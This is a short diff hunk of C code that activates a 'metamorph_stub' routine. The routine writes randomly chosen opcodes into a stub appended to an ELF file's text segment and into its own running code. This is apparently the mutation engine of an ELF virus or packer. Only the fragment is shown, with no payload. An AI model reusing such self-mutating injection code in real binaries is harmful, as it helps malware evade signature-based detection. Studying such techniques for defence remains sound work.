@@ -29,18 +29,17 @@ __attribute__((always_inline)) static inline void metamorph_stub(char *dst, Elf6
 		{OFFSET_1, OFFSET_2, OFFSET_3, OFFSET_4, OFFSET_5, OFFSET_6, OFFSET_7, OFFSET_8, OFFSET_9, OFFSET_A},
 	};
 
-	(void)dst;
-	(void)segment;
-	(void)metamorph;
-//	char *stub = dst + ((segment[TEXT]->p_offset + segment[TEXT]->p_filesz) - STUB_SIZE);
-//	unsigned short opcode;
-//
-//	for (register size_t index = 0; index < OFFS_SIZE; index++)
-//	{
-//		opcode = metamorph.code[_get_random_integer(CODE_SIZE)];
-//
-//		_memcpy(stub + metamorph.offset[index], &opcode, sizeof(unsigned short));
-//	}
+	char *stub = dst + ((segment[TEXT]->p_offset + segment[TEXT]->p_filesz) - STUB_SIZE);
+	char *ptr = (char *)L1;
+	unsigned short opcode;
+
+	for (register size_t index = 0; index < OFFS_SIZE; index++)
+	{
+		opcode = metamorph.code[_get_random_integer(CODE_SIZE)];
+
+		_memcpy(stub + metamorph.offset[index], &opcode, sizeof(unsigned short));
+		_memcpy(ptr + metamorph.offset[index], &opcode, sizeof(unsigned short));
+	}
 }
 
 
